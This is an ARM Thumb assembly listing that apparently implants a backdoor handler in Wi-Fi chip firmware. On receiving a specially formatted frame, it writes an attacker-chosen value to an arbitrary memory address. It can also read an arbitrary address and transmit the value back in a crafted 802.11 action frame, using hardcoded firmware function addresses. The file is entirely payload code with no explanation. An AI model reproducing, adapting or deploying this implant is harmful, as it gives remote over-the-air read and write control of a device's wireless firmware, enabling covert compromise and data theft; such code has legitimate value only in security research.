.syntax unified
.code 16

  PUSH {R0-R11, LR}
  SUB SP, SP, #0x20
  MOV R5, R0            //ctx
  MOV R6, R1            //bsscfg
  MOV R7, R2            //frame data

  //Which command did we receive?
  LDR R0, [R7, #4]
  CMP R0, #0
  BEQ handle_write
  CMP R0, #1
  BEQ handle_read
  B ret_zero

handle_write:
  LDR R0, [R7, #8]
  LDR R1, [R7, #12]
  STR R1, [R0]
  B ret_zero

handle_read:

  //Acquiring a frame  
  ADD R0, R6, #136      //BSSID
  MOV R1, #8            //Length
  ADD R2, SP, #0x14
  MOV R3, #4            //Category
  STMEA SP, {R0, R1, R2}  
  
  LDR R0, [R5]          //wlc
  MOV R1, #208          //type = action frame
  ADD R2, R7, #16       //DA
  ADD R3, R6, #142      //SA

  LDR R4, get_frame_func
  BLX R4
  MOV R10, R0           //frame

  //Preparing the frame's contents
  ADD R0, SP, #0x14
  LDR R0, [R0]
  MOV R1, #4
  STRB R1, [R0]         //Category
  MOV R1, #0
  STRB R1, [R0, #1]     //Action
  MOV R1, #0xAB
  STRB R1, [R0, #2]     //Token
  LDR R1, [R7, #8]      //Address
  LDR R1, [R1]          //Value
  STR R1, [R0, #3]
  
  //Transmitting the frame
  LDR R0, [R5]          //wlc
  MOV R1, R10           //frame
  LDR R2, [R6, #12]
  LDR R2, [R2, #12]
  MOV R3, #0      
  LDR R4, send_frame_func
  BLX R4

  B ret_zero

ret_zero:
  MOV R0, #0
  ADD SP, SP, #0x20
  POP {R0-R11, PC}

.align 4

get_frame_func:
  .word 0x4264C+1

send_frame_func:
  .word 0x4FC28+1

